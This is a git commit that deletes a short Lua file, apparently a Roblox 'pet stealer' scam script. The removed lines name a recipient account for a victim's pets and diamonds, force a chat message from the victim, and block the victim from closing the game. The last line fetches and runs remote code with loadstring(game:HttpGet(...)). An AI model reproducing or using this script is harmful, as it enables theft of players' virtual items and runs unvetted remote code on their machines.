0d51190c8ed3cdb9593cf7fe0faee412b04ec3de
SCRIPTINGCOMMUNITY <137361755+SCRIPTINGCOMMUNITY@users.noreply.github.com>
2023-06-23 16:48:08 +0500

    Delete GaiPoloMDRs_4016.lua

--- GaiPoloMDRs_4016.lua
+++
@@ -1,8 +0,0 @@
-
-_G.Username = "shrek" --// Username To Send Pets To
-_G.GiftMessage = "penises" --// Message For The Gift To Say
-_G.SendMessage = "sheek" --// Message the victim will send in the chat on execution
-_G.Diamonds = 2 --// Amount Of Diamonds To detect alt set an amount of diamond that if the target is under this number, the script will show them an error
-_G.UnlockPets = true --// Unlocks Locked Pets
-_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SCRIPTINGCOMMUNITY/SCRIPTS/GaiPoloMDRs_4016.lua"))()
